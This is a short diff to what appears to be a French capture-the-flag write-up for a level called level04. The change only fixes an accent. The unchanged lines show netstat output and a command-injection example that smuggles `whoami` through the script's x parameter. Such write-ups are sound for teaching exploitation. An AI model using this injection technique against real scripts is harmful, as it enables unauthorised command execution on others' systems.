@@ -39,7 +39,7 @@ Proto Recv-Q Send-Q Local Address           Foreign Address         State
 tcp6       0      0 :::4747                 :::*                    LISTEN
 ...
 ```
-Le deuxieme point, on peut executer des commandes via le point numero 3 qui est le parametre x.
+Le deuxieme point, on peut exécuter des commandes via le point numero 3 qui est le parametre x.
 ```
 $ ./level04.pl x='`whoami`'
 Content-type: text/html
